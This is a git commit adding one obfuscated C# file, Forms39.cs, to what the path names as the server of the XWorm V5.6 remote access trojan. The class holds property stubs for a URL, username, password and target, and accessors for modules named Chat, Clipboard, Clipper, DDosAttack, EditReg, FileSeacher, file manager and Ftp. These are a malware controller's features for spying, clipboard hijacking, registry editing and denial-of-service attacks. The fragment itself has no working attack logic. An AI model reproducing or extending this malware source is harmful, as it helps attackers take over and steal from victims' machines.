84c9aa6e3364c7d3b395e3fb028649e42d83060e
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:55 +0400

    Forms39.cs

---
+++ XWorm V5.6/Server/Forms/Forms39.cs
@@ -0,0 +1,123 @@
+﻿using A2E79314B814865D5650AFF082C65010;
+using CAFDB0AD5C0090F49A98AA5C877499B7;
+using D938976EF0C9CAB410E2AD573255EDFA;
+using F6F8EED9333F0F8D71E7A14D31419906;
+using FF2D6F102A260C25FF3FD3711F3F0BB9;
+using IF0FF1FFB1CA752C08C9910B024F129F;
+using IF7ECB736801D875D48E6C65CE1BIEF6;
+using S7D96ABC36EA6D7B0530SAC7S496E335;
+using S7E093DDE35EF95BC8F5A79005912BS1;
+using SS50CB53275F50SC17512D1S56E03705;
+using System;
+using System.Diagnostics;
+using System.Runtime.CompilerServices;
+using U889DF415E37B84E37738U5B22B76D28;
+using V484C4C4C728C5A3354885V28B9C45E8;
+using V50CEDEV82C5A9DBBV3E286V5E0V0BV0;
+
+namespace I6FBIC23A7A8A48C2F3BDF833D19D102
+{
+  public class IID32DCI6I7B9802EBAB676I9B4E6BD9 : I2F88ED16A41I5FEI8E9B06BFCAF5E96
+  {
+    public static int P08AFCBA42B6C0F485CB36C87F384436;
+    public static int PC0611859B620781F12APCC9DP01B369;
+    public static int PPF166E8152F6A7PPPPF7F4A93AB4937;
+    public static int PEF42369B5904DP6EEE86A727F94BF06;
+
+    public string sUrl
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ぬ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("ぶ");
+    }
+
+    public string sUsername
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ぽ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("す");
+    }
+
+    public string sPassword
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ゕ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("か");
+    }
+
+    public string Target
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ょ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("ゐ");
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public V1B0A7VF02V00E8115CAE37DB277B27D get_Chat()
+    {
+      ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_Chat = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<V1B0A7VF02V00E8115CAE37DB277B27D>(((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_Chat);
+      return ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_Chat;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public LAF1B3D9D50BC7AFCBE87C70EDCDA05L get_Clipboard()
+    {
+      ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_Clipboard = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<LAF1B3D9D50BC7AFCBE87C70EDCDA05L>(((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_Clipboard);
+      return ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_Clipboard;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public VCE29286AEB2492D6F2V9C57V8V2B5C2 get_Clipper()
+    {
+      ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_Clipper = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<VCE29286AEB2492D6F2V9C57V8V2B5C2>(((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_Clipper);
+      return ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_Clipper;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public V0C8ACE7F1ECFE94VF3FVV48FFD95CV8 get_CustomOpen()
+    {
+      ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_CustomOpen = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<V0C8ACE7F1ECFE94VF3FVV48FFD95CV8>(((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_CustomOpen);
+      return ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_CustomOpen;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public S711C44SAE74C7292S41C3B357BBA4FC get_DDosAttack()
+    {
+      ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_DDosAttack = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<S711C44SAE74C7292S41C3B357BBA4FC>(((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_DDosAttack);
+      return ((FAFCD0C18FFE8F29EF883C1B32FB3915) this).m_DDosAttack;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public S6640E555CS092A8E845F228E804BCA1 get_EditReg()
+    {
+      ((F52F19CDAAECA06421655E747A6BC70E) this).m_EditReg = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<S6640E555CS092A8E845F228E804BCA1>(((F52F19CDAAECA06421655E747A6BC70E) this).m_EditReg);
+      return ((F52F19CDAAECA06421655E747A6BC70E) this).m_EditReg;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public SCEBA68B300S5051727F2F1C08CS78A6 get_FileSeacher()
+    {
+      ((F52F19CDAAECA06421655E747A6BC70E) this).m_FileSeacher = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<SCEBA68B300S5051727F2F1C08CS78A6>(((F52F19CDAAECA06421655E747A6BC70E) this).m_FileSeacher);
+      return ((F52F19CDAAECA06421655E747A6BC70E) this).m_FileSeacher;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public CE92891172D009CDBDBB0BB897E20EC8 get_FM()
+    {
+      ((F52F19CDAAECA06421655E747A6BC70E) this).m_FM = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<CE92891172D009CDBDBB0BB897E20EC8>(((F52F19CDAAECA06421655E747A6BC70E) this).m_FM);
+      return ((F52F19CDAAECA06421655E747A6BC70E) this).m_FM;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public BB6522B3128741063CF278262694FEB9 get_Ftp()
+    {
+      ((F52F19CDAAECA06421655E747A6BC70E) this).m_Ftp = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<BB6522B3128741063CF278262694FEB9>(((F52F19CDAAECA06421655E747A6BC70E) this).m_Ftp);
+      return ((F52F19CDAAECA06421655E747A6BC70E) this).m_Ftp;
+    }
+  }
+}
